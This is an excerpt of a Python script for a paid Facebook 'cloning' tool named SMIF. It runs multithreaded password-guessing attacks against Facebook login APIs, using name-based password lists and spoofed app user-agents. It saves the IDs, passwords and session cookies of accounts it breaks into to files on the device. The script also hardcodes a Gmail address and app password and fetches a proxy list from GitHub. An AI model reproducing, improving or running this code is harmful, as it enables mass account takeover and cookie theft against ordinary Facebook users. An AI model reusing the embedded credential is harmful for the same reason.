...
if not 'print' in open(first+'sessions.py','r').read():
    ...
    exit('\x1b[1;97m[\x1b[1;97m§\x1b[1;97m]\x1b[1;97m DO NOT TRY TO FUCK YOUR BY ALEXANDER AXL MONTREAL...')
def clear():
        os.system('clear')
#os.system('clear')
#print('\x1b[1;97m[\x1b[1;97m●\x1b[1;97m]\x1b[1;97m CHECKING UPDATE...!\x1b[1;97m [\x1b[1;97m–\x1b[1;97m]\x1b[1;97m')
#time.sleep(3)
#os.system('clear')
#print('\x1b[1;97m[\x1b[1;97m●\x1b[1;97m]\x1b[1;97m LOADING ●\x1b[1;97m●\x1b[1;97m●\x1b[1;97m●\x1b[1;97m●\x1b[1;97m [\x1b[38;5;46mSMIF TOOL\x1b[1;97m]\x1b[1;97m')
#time.sleep(5)
try:
...
alives,checkpoints,loop,apk=[],[],0,[]
ses=requests.Session()
myid=uuid.uuid4().hex[:5].upper()
from email.message import EmailMessage
import ssl,smtplib
email_sender = 'SMIFSubscription1@gmail.com'
email_password = 'jxgjlutwxmxclkgc'
email_receiver = 'SMIFSubscription2@gmail.com'
...
try:
	open('.prox.txt','w').write(requests.get('https://raw.githubusercontent.com/ALEXANDERAXLURLUV15/apifuck/main/prox.txt').text)
...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.AXLL', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.AXLL', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
...
def smif(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alexander = ' (*-*) 2009 √'
        elif ids[:9] in ['100000000']       :alexander = ' ACCOUNT  2009 √'
        elif ids[:8] in ['10000000']        :alexander = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alexander = ' ACCOUNT 2009 √'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alexander = ' ACCOUNT 2010 √'
        elif ids[:6] in ['100001']          :alexander = ' ACCOUNT 2010/2011 √'
        elif ids[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
        elif ids[:6] in ['100004']          :alexander = ' ACCOUNT 2012/2013 √'
        elif ids[:6] in ['100005','100006'] :alexander = ' ACCOUNT 2013/2014 √'
        elif ids[:6] in ['100007','100008'] :alexander = ' ACCOUNT 2014/2015 √'
        elif ids[:6] in ['100009']          :alexander = ' ACCOUNT 2015 √'
        elif ids[:5] in ['10001']           :alexander = ' ACCOUNT 2015/2016 √'
        elif ids[:5] in ['10002']           :alexander = ' ACCOUNT 2016/2017 √'
        elif ids[:5] in ['10003']           :alexander = ' ACCOUNT 2018/2019 √'
        elif ids[:5] in ['10004']           :alexander = ' ACCOUNT 2019/2020 √'
        elif ids[:5] in ['10005']           :alexander = ' ACCOUNT 2020 √'
        elif ids[:5] in ['10006','10007','']:alexander = ' ACCOUNT 2021 √'
        elif ids[:5] in ['10008']           :alexander = ' ACCOUNT 2022 √'
        elif ids[:5] in ['10009']           :alexander = ' ACCOUNT 2023 √'
        elif ids[:5] in ['6155']            :alexander = ' ACCOUNT 2023 √'
        else:alif=''
    elif len(ids) in [9,10]:
        alexander = ' ACCOUNT 2008/2009 √'
    elif len(ids)==8:
        alexander = ' ACCOUNT 2007/2008 √'
    elif len(ids)==7:
        alexander = ' ACCOUNT 2006/2007 √'
    elif len(ids)==5:
        alexander = ' ACCOUNT 2023/2024 √'
    else:alexander=''
    return alexander
...
try:
    ...
    operator = output.replace(',', '<|>').replace('\n', '')
...
folder_path = "/sdcard/SMIF"

ipinfo = requests.post('http://ip-api.com/json/')
...
sys.stdout.write('\x1b]2; SMIF\x07')
def AXLLL():
    print(f"\033[1;36m             ███████╗███╗   ███╗██╗███████╗\n\033[1;36m             ██╔════╝████╗ ████║██║██╔════╝\n\033[1;36m             ███████╗██╔████╔██║██║█████╗\n\033[1;36m             ╚════██║██║╚██╔╝██║██║██╔══╝\n\033[1;36m             ███████║██║ ╚═╝ ██║██║██║\n\033[1;36m             ╚══════╝╚═╝     ╚═╝╚═╝╚═╝\n       \033[97;1m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[97;1m\n       \033[97;1m║      \033[97;1m[ F U C K Y O U B Y P A S S E R ]     \033[97;1m ║\033[97;1m\n       \033[97;1m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[97;1m\n\033[97;1m──────────────────────────────────────────────────────────────────\n\033[1;36m[§] \033[1;37mIP ADDRESS :   {ips}\n\033[1;36m[§] \033[1;37mCOUNTRY    :   {country}\n\033[1;36m[§] \033[1;37mSIP        :   {isp}\n\033[1;36m[§] \033[1;37mSTATUS     :   PAID\n──────────────────────────────────────────────────────────────────")
...
def setup_user_data():
    ...
    create_file_if_not_exists("data/namesmif.xml")
    create_file_if_not_exists("data/passwordsmif.xml")
    ...
    uname = get_user_input("data/namesmif.xml", f" \x1b[1;97m[\x1b[1;97m●\x1b[1;97m]\x1b[1;97m ENTER YOUR NAME : ")
    upass = get_user_input("data/passwordsmif.xml", f" \x1b[1;97m[\x1b[1;97m●\x1b[1;97m]\x1b[1;97m ENTER YOUR PASSWORD : ")

setup_user_data()

def get_user_name():
    with open("data/namesmif.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_password():
    with open("data/passwordsmif.xml", "r") as file_obj:
        return file_obj.readline().strip()
...
def Subscription():
	...
	clear()
	AXLLL()
	r1=str(urlopen("https://github.com/ALEXANDERAXLMONTREAL/SMIF/blob/main/key.txt").read())
	if key1 in r1:
		os.system('clear')
		AXLLL()
	else:
		...
		os.system("clear")
		AXLLL()
		print(" \033[1;34m SEND KEY ON FACEBOOK  \033[1;37m")
		linexx()
		print(" \033[1;32m YOU HAVE TO GET APPROVE FIRST BEFORE USING IT \033[1;37m")
		print(" \033[1;32m NOTE : THIS IS A PAID TOOL!   \033[1;37m")
		linexx()
		print(" \033[1;36m [ MODE OF PAYMENT : GCASH ] ")
		linexx()
		print(" \033[1;31m YOUR KEY IS NOT APPROVED. \033[1;37m")
		linexx()
		print(" \033[1;33m COPY AND SEND KEY TO ALEXANDER AXL MONTREAL \033[1;37m")
		linexx()
		name = input(" \033[1;32m ENTER YOUR USERNAME : \033[1;37m")
		linexx()
		print(" \033[1;36m YOUR KEY : \033[1;37m"+name+'-'+ah+key1)
		linexx()
		name = input(" \033[1;34m YOUR NAME : \033[1;37m")
		linexx()
		email = input(" \033[1;35m YOUR EMAIL : ")
		linexx()
		input(" \033[1;32m PRESS ENTER TO SEND KEY \033[1;37m")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+email+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+name+'-'+ah+key1
		os.system('am start https://www.messenger.com/t/AlexanderAxlMontreal.IAmLimitless'+tks)
		Subscription()                                                                                 
Subscription()  
...
def menu():
			clear()
			clr()
			print('\033[1;97m [1] FILE CLONING\n [2] FILE MAKING\n [A] FACEBOOK FOLLOW PLEASE\n [0] EXIT')
			linex()
			xd=input(' \033[1;97mCHOOSE : ')
			if xd in ['1','01']:
				clear()
				clr()
				print(' \033[1;97mPUT FILE EXAMPLE :  /sdcard/File.txt  etc..')
				linex()
				...
				print(' [5] METHOD \33[1;32m [5]\33[1;37m ')
				print(' [6] METHOD \33[1;32m [6]\33[1;37m ')
				linex()
				...
				clear()
				clr()
				print('\033[1;37m [1] AUTO PASSWORD 1 \n [2] AUTO PASSWORD 2 \n [3] AUTO PASSWORD 3 \n [4] AUTO PASSWORD 4 \n [5] AUTO PASSWORD 5 \n [6] AUTO PASSWORD 6\n [7] AUTO PASSWORD 7 \n [8] AUTO PASSWORD 8\n [9] CHOICE PASSWORD')
				linex()
				password=input('\033[1;37mCHOOSE : ')
				if password in ['1','01']:
					plist = ['first last','last first','firstlast','lastfirst','firstlast143']
				if password in ['2','02']:
					plist = ['first123', 'first12345','first123456789','first143','last123','last12345','last123456789','first143']
				if password in ['3','03']:
					plist = ['first01','first02','first03','first04','first05','first06','first07','first08','first09']
				if password in ['4','04']:
					plist = ['firstlast','First123','firstlast123','firstlast12345','first123','first143','first12345','first16','first18','first17','first098','firstpogi','firstganda']
				if password in ['5','05']:
					plist = ['first10','first11','first12','first13','first14','first15','first16','first17','first18','first19']
				if password in ['6','06']:
				...
				if password in ['8','08']:
					plist = ['first last','firstlast','first123','first12345','first1234','firstlast123','firstlast@123','last123','Last12345','firstlast@123','last123','Last12345','first123456','first@123','First@123','first321','First@12','first@1234','First123','First123','@first123','@first1234','first@@@']
				if password in ['9','09']:
					try:
						...
						ps_limit =1
					linex()
					print('\033[1;92mEXAMPLE : first last,firstlast,first123')
					linex()
					for i in range(ps_limit):
						plist.append(input(f' \033[1;97mENTER PASSWORD {i+1}: '))
				clear()
				print(' \033[1;97mDO YOU WENT SHOW CHECKPOINT ACCOUNT? (y/n): ')
				linex()
				cx=input('\033[1;97mCHOOSE : ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					for user in fo:
						...
						if mthd in ['1','01']:
							...
							crack_submit.submit(api10,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' THE PROCESS HAS COMPLETED')
				print(' TOTAL ALIVE/CHECKPOINT: '+str(len(alives))+'/'+str(len(checkpoints)))
				linex()
				input(' PRESS ENTER TO BACK ')
				os.system('python SMIF.py')
			elif xd in ['2','02']:
				login()				
			elif xd in ['A','A']:
				os.system('xdg-open https://m.facebook.com/AlexanderAxlMontreal.IAmLimitless')
				menu()
			elif xd in ['0','00']:
				exit(' THANKS FOR USE 🥰 ')
			else:
...
def api1(ids,names,passlist):
        try:
                global loop,alives,checkpoints,sim_id
                sys.stdout.write('\r\r\033[1;37m [SMIF-M1] %s \033[1;37m| \033[1;32mALIVE:-%s \033[1;37m'%(loop,len(alives)));sys.stdout.flush()
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/242.0.0.15.119;FBBV/184324652;FBDM/{density=1.75,width=720,height=1423};FBLC/en_PH;FBRV/368298519;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a;]"
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [USERNAME] '+ids+'\033[1;97m')
                                        print('\r\r\033[1;33m [PASSWORD] '+pas+'\033[1;97m')
                                        ...
                                        print('\r\r\033[1;38m [DATE YEAR]'+smif(ids)+'\033[1;97m')
                                        print("\r\r\033[1;33m \033[0;34m[FBLINK] : https://www.facebook.com/"+ids)
                                        print("\r\r\033[1;37m COOKIE : \033[1;33"+coki)
                                        open('/sdcard/SMIF/SMIF-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/SMIF/SMIF-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        alives.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  ALIVE,  ID"')                                        
                                        print('\033[1;32m───────────[SMIF]───────────')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [PATAY-CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SMIF/SMIF-CHECKPOINT.txt','a').write(ids+'|'+pas+'\n')
                                                break
...
def api2(ids,names,passlist):
        try:
                global loop,alives,checkpoints,sim_id
                sys.stdout.write('\r\r\033[1;37m [SMIF-M2] %s \033[1;37m| \033[1;32mALIVE:-%s \033[1;37m| \033[1;31mCHECKPOINT:-%s \033[1;37m'%(loop,len(alives),len(checkpoints)));sys.stdout.flush()
                Session=requests.session()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
...
'Content-Length': '706'}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SMIF-ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerSMIF = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SMIFramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SMIFramxan};{powerSMIF}"
                                        open('/sdcard/SMIF/SMIF-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/SMIF/SMIF-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        alives.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global loop,alives,checkpoints,sim_id
                sys.stdout.write('\r\r\033[1;37m [SMIF-M3] %s \033[1;37m| \033[1;32mALIVE:-%s \033[1;37m'%(loop,len(alives)));sys.stdout.flush()
                Session=requests.session()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
...
'Content-Length': '847'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        print('\r\r\033[1;38m [DATE YEAR]'+smif(ids)+'\033[1;97m')
                                        print("\r\r\033[1;33m \033[0;34m[FBLINK] : https://www.facebook.com/"+ids)
                                        print("\r\r\033[1;37m COOKIE : \033[1;33m"+coki)
                                        open('/sdcard/SMIF/SMIF-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/SMIF/SMIF-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        alives.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  ALIVE,  ID"')                                        
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/SMIF-CHECKPOINT.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                checkpoints.append(ids)
                        else:
                                        continue
...
def api5(ids,names,passlist):
        try:
                global loop,alives,checkpoints,sim_id
                sys.stdout.write('\r\r\033[1;37m [SMIF-M5] %s \033[1;37m| \033[1;32mALIVE:-%s \033[1;37m'%(loop,len(alives)));sys.stdout.flush()
                Session=requests.session()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
...
def api6(ids,names,passlist):
        try:
                global loop,alives,checkpoints,sim_id
                sys.stdout.write('\r\r\033[1;37m [SMIF-M6] %s \033[1;37m| \033[1;32mALIVE:-%s \033[1;37m'%(loop,len(alives)));sys.stdout.flush()
                Session=requests.session()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
